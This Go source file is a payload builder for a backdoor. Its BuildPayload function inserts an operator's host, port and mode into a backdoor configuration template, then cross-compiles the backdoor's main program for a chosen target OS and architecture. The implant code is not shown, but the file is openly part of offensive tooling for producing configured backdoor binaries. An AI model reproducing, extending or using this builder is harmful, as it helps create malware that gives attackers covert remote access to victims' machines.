package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func BuildPayload(outputPath, host, port, mode, targetOS, targetArch string) error {

	templatePath := "backdoor/config/config.go.tmpl"
	targetPath := "backdoor/config/config.go"

	templateContent, err := os.ReadFile(templatePath)
	if err != nil {
		return fmt.Errorf("error leyendo plantilla config.go.tpl: %v", err)
	}

	content := string(templateContent)
	content = strings.ReplaceAll(content, "{{HOST}}", host)
	content = strings.ReplaceAll(content, "{{PORT}}", port)
	content = strings.ReplaceAll(content, "{{MODE}}", mode)

	err = os.WriteFile(targetPath, []byte(content), 0644)
	if err != nil {
		return fmt.Errorf("error escribiendo config.go: %v", err)
	}

	// Compilar
	absPath, err := filepath.Abs("backdoor/main.go")
	if err != nil {
		return fmt.Errorf("error obteniendo ruta absoluta: %v", err)
	}
	fmt.Println("Directorio: " + absPath)
	cmd := exec.Command("go", "build", "-o", outputPath, absPath)
	cmd.Env = append(os.Environ(), "GOOS="+targetOS, "GOARCH="+targetArch, "CGO_ENABLED=0")

	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Salida del build:\n", string(out))
		return fmt.Errorf("falló la compilación: %v", err)
	}

	return nil
}
